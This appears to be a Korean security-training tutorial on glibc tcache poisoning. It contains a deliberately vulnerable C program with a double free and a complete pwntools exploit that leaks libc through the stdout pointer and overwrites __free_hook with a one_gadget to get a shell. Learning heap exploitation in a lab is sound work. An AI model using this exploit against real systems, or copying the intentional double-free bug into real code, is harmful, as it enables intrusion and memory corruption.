# Exploit Tech: Tcache Poisoning

# 들어가며

## 서론

---

Tcache poisoning은 중복으로 연결된 청크를 재할당하면, 그 청크가 해제된 청크인 동시에, 할당된 청크라는 특징을 이용한다. 이러한 중첩 상태를 이용하면 공격자는 임의 주소에 청크를 할당할 수 있으며, 그 청크를 이용하여 임의 주소의 데이터를 읽거나 조작할 수 있다.

Tcache poisoning의 원리와 효과에 대해 알아보고, 이를 이용하여 간단한 예제를 익스플로잇 해보자.

## 실습 환경 Dockerfile

---

이전에 설정한 환경을 이용한다.

# Tcache Poisoning

## Tcache Poisoning

---

**Tcache Poisoning**은 tcache를 조작하여 임의 주소에 청크를 할당시키는 공격 기법을 말한다.

### 원리

tcache 청크의 구조를 살펴보면 freed 청크의 경우 In-use 청크에서 데이터를 입력하는 부분이었던 부분이 next와 key로 사용되는 것을 알 수 있다. 따라서 double free bug가 발생하여 한 청크에 대해 freed와 In-use 두가지 상태가 동시에 발생하면 In-use를 이용해 데이터를 next에 덮어쓸 수 있게 된다. next가 어떤 주소로 덮어 써지면 그 주소를 포인터에 할당할 수 있게 된다.

### 효과

Tcache Poisoning으로 할당된 청크에 대해 값을 출력하거나, 조작할 수 있다면 임의 주소 읽기(Arbitrary Address Read, AAR)와 임의 주소 쓰기(Arbitrary Address Write, AAW)가 가능하다.

### tcache_poison.c

```c
// Name: tcache_poison.c
// Compile: gcc -o tcache_poison tcache_poison.c -no-pie -Wl,-z,relro,-z,now

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  void *chunk = NULL;
  unsigned int size;
  int idx;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    printf("1. Allocate\n");
    printf("2. Free\n");
    printf("3. Print\n");
    printf("4. Edit\n");
    scanf("%d", &idx);

    switch (idx) {
      case 1:
        printf("Size: ");
        scanf("%d", &size);
        chunk = malloc(size);
        printf("Content: ");
        read(0, chunk, size - 1);
        break;
      case 2:
        free(chunk);
        break;
      case 3:
        printf("Content: %s", chunk);
        break;
      case 4:
        printf("Edit chunk: ");
        read(0, chunk, size - 1);
        break;
      default:
        break;
    }
  }
  
  return 0;
}
```

# 분석 및 설계

## 분석

---

### 보호 기법

```c
$ checksec tcache_poison
[*] '/home/dreamhack/tcache_poison'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX와 FULL RELRO 보호 기법이 적용되어 있으므로 셸코드를 실행시키기 어렵고, GOT 오버라이트 공격도 수행하기 어렵다. 이때 훅을 덮는 공격 기법을 고려해볼 수 있다.

### 코드 분석

```c
// Name: tcache_poison.c
// Compile: gcc -o tcache_poison tcache_poison.c -no-pie -Wl,-z,relro,-z,now

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  void *chunk = NULL;
  unsigned int size;
  int idx;

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);

  while (1) {
    printf("1. Allocate\n");
    printf("2. Free\n");
    printf("3. Print\n");
    printf("4. Edit\n");
    scanf("%d", &idx);

    switch (idx) {
      case 1:
        printf("Size: ");
        scanf("%d", &size);
        chunk = malloc(size);
        printf("Content: ");
        read(0, chunk, size - 1);
        break;
      case 2:
        free(chunk);
        break;
      case 3:
        printf("Content: %s", chunk);
        break;
      case 4:
        printf("Edit chunk: ");
        read(0, chunk, size - 1);
        break;
      default:
        break;
    }
  }
  
  return 0;
}

```

청크를 해제한 후 chunk 포인터를 해제하지 않으므로 dangling pointer가 생긴다. Edit에서 chunk의 값을 변경할 수 있는데, 이때 dangling pointer를 이용하면 Double Free Bug를 보호하는 기법을 우회하여 Double Free Bug를 발생시킬 수 있다.

따라서 해제된 상태이면서 할당된 청크를 만들 수 있으므로 Tcache Poisoning 공격이 가능하다.

### 익스플로잇 설계

---

임의 주소 읽기로 libc가 매핑된 주소를 알아내면 __free_hook또는 __malloc_hook의 주소를 계산할 수 있고, 임의 주소 쓰기로 해당 주소에 원 가젯 주소를 덮어쓰면 셸을 획득할 수 있다.

코드에 Double Free 취약점이 있고, 관련된 보호 기법을 우회하는 것도 가능하므로 Tcache Poisoning으로 위의 Primitive들을 모두 획득할 수 있다.

### 1. Tcache Poisoning

위에서 살펴본 것과 같이, 청크를 할당한 후 해제하였을 때 생긴 dangling pointer를 이용하여 key 값을 조작하고 다시 해제하면 Tcache Duplication이 가능하다. 이때 다시 청크를 할당하면서 원하는 주소를 값으로 쓰면 tcache에 임의 주소를 추가할 수 있다.

### 2. Libc leak

setvbuf 함수에 인자로 stdin과 stdout을 전달하는데, 이 포인터 변수들은 각각 libc 내부의 IO_2_1_stdin과 IO_2_1_stdout을 가리킨다. 따라서 이 중 한 변수의 값을 읽으면, 그 값을 이용하여 libc 주소를 계산할 수 있다.

이 포인터들은 전역 변수로서 bss에 위치하는데, PIE가 적용되어 있지 않으므로 포인터들의 주소는 고정되어 있다. Tcache Poisoning으로 포인터 변수의 주소에 청크를 할당하여 그 값을 읽을 수 있을 것이다.

### 3. Hook overwrite to get shell

알아낸 libc 주소를 기반으로 __free_hook의 주소와 one_gadget의 주소를 알아낼 수 있다. Tcache Poisoning을 이용해 __free_hook에 청크를 할당하고, 그 청크에 적절한 원 가젯의 주소를 입력하면 free를 호출하여 셸을 획득할 수 있다.

# 익스플로잇

## 익스플로잇

---

### Tcache Poisoning

Double Free 보호 기법을 우회하여 Double Free를 일으켜보자.

```c
#!/usr/bin/env python3
# Name: tcache_poison.py
from pwn import *

p = process('./tcache_poison')
e = ELF('./tcache_poison')

def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def alloc(size, data):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', data)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b':', data)

# Initial tcache[0x40] is empty.
# tcache[0x40]: Empty

# Allocate and free a chunk of size 0x40 (chunk A)
# tcache[0x40]: chunk A
alloc(0x30, b'dreamhack')
free()

# Free chunk A again, bypassing the DFB mitigation
# tcache[0x40]: chunk A -> chunk A -> chunk A -> chunk A -> ...
edit(b'B'*8 + b'\x00')
free()

# Append 0x4141414141414141 to tcache[0x40]
# tcache[0x40]: chunk A -> 0x4141414141414141
alloc(0x30, b'AAAAAAAA')

p.interactive()
```

### libc leak

stdout을 코드 상에서 명시적으로 사용하게 되면 .bss 영역에 libc 내 _IO_2_1_stdout_을 가리키는 포인터가 생긴다. .bss 영역 내의 stdout 포인터는 바이너리가 실행된 후 libc 영역의 _IO_2_1_stdout_ 주소를 가리키도록 초기화되므로, 이를 릭할 수 있다면 libc가 매핑된 주소를 계산할 수 있다.

이때, stdout은 표준 출력과 관련된 중요한 포인터이므로, 가리키는 주소 값을 변경하지 않도록 주의해야 한다.

```c
#!/usr/bin/env python3
# Name: tcache_poison.py
from pwn import *

p = process('./tcache_poison')
e = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')

def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def alloc(size, data):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', data)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b':', data)

# Initial tcache[0x40] is empty.
# tcache[0x40]: Empty

# Allocate and free a chunk of size 0x40 (chunk A)
# tcache[0x40]: chunk A
alloc(0x30, b'dreamhack')
free()

# Free chunk A again, bypassing the DFB mitigation
# tcache[0x40]: chunk A -> chunk A
edit(b'B'*8 + b'\x00')
free()

# Append address of `stdout` to tcache[0x40]
# tcache[0x40]: chunk A -> stdout -> _IO_2_1_stdout_ -> ...
addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout))

# tcache[0x40]: stdout -> _IO_2_1_stdout_ -> ...
alloc(0x30, b'BBBBBBBB')

# tcache[0x40]: _IO_2_1_stdout_ -> ...
_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1] # least significant byte of _IO_2_1_stdout_
alloc(0x30, _io_2_1_stdout_lsb) # allocated at `stdout`

# Libc leak
print_chunk()
p.recvuntil('Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
lb = stdout - libc.symbols['_IO_2_1_stdout_']
fh = lb + libc.symbols['__free_hook']
og = lb + 0x4f432

slog('libc_base', lb)
slog('free_hook', fh)
slog('one_gadget', og)

p.interactive()
```

addr_stdout = e.symbols[’stdout’]
바이너리 내부의 .bss 영역의 stdout 포인터를 찾아 addr_stdout에 넣는다.

이때 tcache는 다음과 같이 변한다.

1. A → A → A → A → … (double free bug)
2. A → stdout → _IO_2_1_stdout_
→ A 하나를 할당하면서 값에 stdout의 주소를 넣었는데, 이는 next를 변경한 것과 같다. 이때 stdout은 _IO_2_1_stdout_의 주소를 값으로 가지고 있으므로 stdout의 next는 _IO_2_1_stdout과 같다.

alloc(0x30, b'BBBBBBBB')
이때 바로 stdout을 사용하지 못하고 tcache 내부에 남아있는 A를 제거해주어야 사용할 수 있으므로 아무런 값이나 할당해서 A 청크를 빼낸다.

_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]
alloc(0x30, _io_2_1_stdout_lsb) # allocated at `stdout`
malloc을 한 후 바로 해당 청크에 값을 쓰는 과정이 있는데, 이렇게 되면 stdout에 저장되어 있는 값인 _IO_2_1_stdout_의 값을 건드리게 된다. ASLR의 특징을 이용하여 하위 12비트에 해당하는 1바이트만 값을 동일하게 써줘서 값을 동일하게 유지하면서 stdout을 청크에 할당한다.

이후 값을 읽어서 해당 값을 기준으로 free hook, one_gadget을 구한다.

### Hook overwrite to get shell

앞에서 구한 __free_hook의 주소에 Tcache Poisoning으로 청크를 할당하고, 원 가젯의 주소를 덮어쓰면, free를 호출하여 셸을 획득할 수 있다.

여기서 주의할 점은, 앞서 오염시킨 tcache[0x40]을 재사용하면 stdout의 next 였던 _IO_2_1_stdout_이 청크로 할당된다는 점이다. 따라서 다른 크기의 청크를 할당해서 사용해야 한다.

```c
#!/usr/bin/env python3
# Name: tcache_poison.py
from pwn import *

p = process('./tcache_poison')
e = ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')

def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def alloc(size, data):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b':', str(size).encode())
    p.sendafter(b':', data)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print_chunk():
    p.sendlineafter(b'Edit\n', b'3')

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b':', data)

# Initial tcache[0x40] is empty.
# tcache[0x40]: Empty

# Allocate and free a chunk of size 0x40 (chunk A)
# tcache[0x40]: chunk A
alloc(0x30, b'dreamhack')
free()

# Free chunk A again, bypassing the DFB mitigation
# tcache[0x40]: chunk A -> chunk A -> ...
edit(b'B'*8 + b'\x00')
free()

# Append address of `stdout` to tcache[0x40]
# tcache[0x40]: chunk A -> stdout -> _IO_2_1_stdout_ -> ...
addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout))

# tcache[0x40]: stdout -> _IO_2_1_stdout_ -> ...
alloc(0x30, b'BBBBBBBB')

# tcache[0x40]: _IO_2_1_stdout_ -> ...
_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1] # least significant byte of _IO_2_1_stdout_
alloc(0x30, _io_2_1_stdout_lsb) # allocated at `stdout`

print_chunk()
p.recvuntil(b'Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
lb = stdout - libc.symbols['_IO_2_1_stdout_']
fh = lb + libc.symbols['__free_hook']
og = lb + 0x4f432

slog('libc_base', lb)
slog('free_hook', fh)
slog('one_gadget', og)

# Overwrite the `__free_hook` with the address of one-gadget

# Initial tcache[0x50] is empty.
# tcache[0x50]: Empty

# tcache[0x50]: chunk B
alloc(0x40, b'dreamhack') # chunk B
free()

# tcache[0x50]: chunk B -> chunk B -> ...
edit(b'C'*8 + b'\x00')
free()

# tcache[0x50]: chunk B -> __free_hook
alloc(0x40, p64(fh))

# tcache[0x50]: __free_hook
alloc(0x40, b'D'*8)

# __free_hook = the address of one-gadget
alloc(0x40, p64(og))

# Call `free()` to get shell
free()

p.interactive()
```